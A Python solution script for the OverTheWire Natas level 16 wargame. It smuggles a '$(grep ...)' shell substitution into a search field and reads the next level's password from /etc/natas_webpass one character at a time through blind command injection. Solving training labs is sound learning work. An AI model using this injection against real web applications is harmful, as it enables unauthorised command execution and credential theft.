#!/usr/bin/env python3

import getpass
import requests

###############################################################################
# Configuration
###############################################################################

# The URL of the level as well as the username for it. There will be a known
# password as well, but read it from the user so that it is not published.
URL = 'http://natas16.natas.labs.overthewire.org/index.php'
USERNAME = 'natas16'

# The strings used to determine if the partial password guess is incorrect.
FAILURE_STRING = "hackers"

# The length of the target password is assumed to be 32, like all previous
# passwords. The characters used in the password guesses are also assumed to be
# the same as in all previous passwords: a-z, A-Z, and 0-9.
PASSWORD_LENGTH = 32
PASSWORD_CHARACTERS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

# Global counter for API calls
http_request_count = 0

def get_authentication_credentials() -> tuple[str, str]:
    """Prompt the user for the password and return the authentication tuple."""
    password = getpass.getpass(prompt=f'Enter password for {USERNAME}: ')
    return USERNAME, password

def send_post_request(data: dict[str, str], credentials: tuple[str, str]) -> str:
    """
    Sends a POST request with the given data and authentication.
    Returns the response text or raises an exception on failure.
    """
    global http_request_count
    http_request_count += 1
    response = requests.post(URL, auth=credentials, data=data)
    response.raise_for_status()
    return response.text

def try_password_char(password_guess: str, credentials: tuple[str, str]) -> bool:
    """
    Test a single password guess. Returns True if correct, False if incorrect.
    """
    payload = {
        'needle': f'{ FAILURE_STRING }$(grep ^{ password_guess } /etc/natas_webpass/natas17)'
    }

    response_text = send_post_request(payload, credentials)

    return FAILURE_STRING in response_text

def main():
    credentials = get_authentication_credentials()
    password = ''

    while len(password) < PASSWORD_LENGTH:
        for char in PASSWORD_CHARACTERS:
            guess = password + char
            try:
                if try_password_char(guess, credentials):
                    print(f"[+] Found character {len(password) + 1} of {PASSWORD_LENGTH}: {char}")
                    password += char
                    break
            except requests.RequestException as e:
                print(f"[!] Network error on '{guess}': {e}")
                return
            except RuntimeError as e:
                print(f"[!] {e}")
                return

    print(f"[✔] Password confirmed: {password}")

    print(f"[*] Total API calls: {http_request_count}")

if __name__ == '__main__':
    main()
